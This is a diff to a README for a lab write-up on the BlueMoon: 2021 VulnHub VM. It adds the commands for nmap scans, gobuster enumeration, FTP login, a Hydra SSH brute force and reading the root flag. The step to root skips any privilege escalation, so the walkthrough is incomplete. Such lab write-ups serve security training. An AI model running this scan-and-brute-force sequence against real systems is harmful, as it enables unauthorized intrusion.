@@ -6,24 +6,6 @@
 
 ---
 
-## Table of Contents
-
-- [Overview](#overview)
-- [Tools Used](#tools-used)
-- [Step 1: Identify Attacker IP](#step-1-identify-attacker-ip)
-- [Step 2: Discover Network Hosts](#step-2-discover-network-hosts)
-- [Step 3: Port Scanning](#step-3-port-scanning)
-- [Step 4: Web Enumeration](#step-4-web-enumeration)
-- [Step 5: SSH Brute Force](#step-5-ssh-brute-force)
-- [Step 6: Privilege Escalation](#step-6-privilege-escalation)
-- [Step 7: Capture Root Flag](#step-7-capture-root-flag)
-- [Attack Summary](#attack-summary)
-- [Security Lessons](#security-lessons)
-- [Conclusion](#conclusion)
-- [Screenshots Folder Structure](#screenshots-folder-structure)
-
----
-
 ## Overview
 
 This repository documents a penetration testing lab on **BlueMoon: 2021** VulnHub VM.  
@@ -61,7 +43,7 @@ Result:
 Screenshot: screenshots/attacker-ip.png
 
 
-## Step 2: Discover Target Machine
+## Step 2: Discover Hosts in Network
 
 Command:
 
@@ -76,3 +58,147 @@ Result:
 
 Screenshot: screenshots/netdiscover.png
 
+
+## Step 3: Scan Network for Active Hosts
+
+Command:
+
+```bash
+nmap -sn 192.168.0.0/24
+```
+
+Result:
+```bash
+Host is up: 192.168.0.65
+```
+
+Screenshot: screenshots/nmap-host.png
+
+
+## Step 4: Detailed Port Scan
+Command:
+
+```bash
+nmap -sC -sV -Pn -vv 192.168.0.65
+```
+
+Result:
+```bash
+21/tcp open ftp
+22/tcp open ssh
+80/tcp open http
+```
+
+Screenshot: screenshots/nmap-port.png
+
+## Step 5: Directory Enumeration
+Command:
+
+```bash
+gobuster dir -u http://192.168.0.65 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+```
+
+Result:
+```bash
+/hidden_text
+```
+
+Screenshot: screenshots/gobuster.png
+
+
+## Step 6: Visit Website
+Open browser and go to:
+
+```bash
+http://192.168.0.65
+```
+
+Screenshot: screenshots/website.png
+
+
+## Step 7: Check Hidden Directory
+Navigate to:
+
+```bash
+[http://192.168.0.65](http://192.168.0.65/hidden_text)
+```
+
+Screenshot: screenshots/hidden_text.png
+
+
+## Step 8: Decode QR Code
+The page contains a QR code that reveals:
+
+```bash
+Username
+Password
+```
+
+Screenshot: screenshots/qrcode.png
+
+
+## Step 9: Access FTP
+Command:
+
+```bash
+ftp 192.168.0.65
+```
+Login using the credentials obtained.
+Screenshot: screenshots/ftp-login.png
+
+
+## Step 10: Read Information File
+Command:
+
+```bash
+cat information.txt
+```
+Screenshot: screenshots/information.png
+
+
+## Step 11: Read Password List
+Command:
+
+```bash
+cat p_lists.txt
+```
+Screenshot: screenshots/passwordlist.png
+
+
+## Step 12: Brute Force SSH Using Hydra
+Command:
+
+```bash
+hydra -l robin -P p_lists.txt ssh://192.168.0.65
+```
+Screenshot: screenshots/hydra.png
+
+
+## Step 13: SSH Access
+Command:
+
+```bash
+ssh robin@192.168.0.65
+```
+Screenshot: screenshots/ssh-login.png
+
+
+## Step 14: Capture Root
+Command:
+
+```bash
+cd /root
+cat root.txt
+```
+Screenshot: screenshots/root.png
+
+
+Conclusion
+
+- Successfully performed:
+- Network discovery
+- Port scanning
+- Web enumeration
+- Credential extraction
+- SSH brute force
+- Root access obtained
